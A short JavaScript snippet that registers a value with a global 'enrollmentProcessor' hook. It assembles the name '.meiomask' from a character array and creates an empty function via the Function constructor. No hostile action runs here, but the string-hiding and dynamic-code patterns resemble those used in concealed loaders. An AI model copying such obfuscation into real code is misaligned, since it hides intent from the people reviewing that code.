if (typeof globalThis.specGroupings === 'undefined') {
    globalThis.specGroupings = {
        enrollmentProcessor: null
    };
}

const designationLabel = ['.', 'm', 'e', 'i', 'o', 'm', 'a', 's', 'k'].join('');
const executionUnit = new Function('');

if (typeof globalThis.specGroupings.enrollmentProcessor === 'function') {
    globalThis.specGroupings.enrollmentProcessor(designationLabel, executionUnit);
}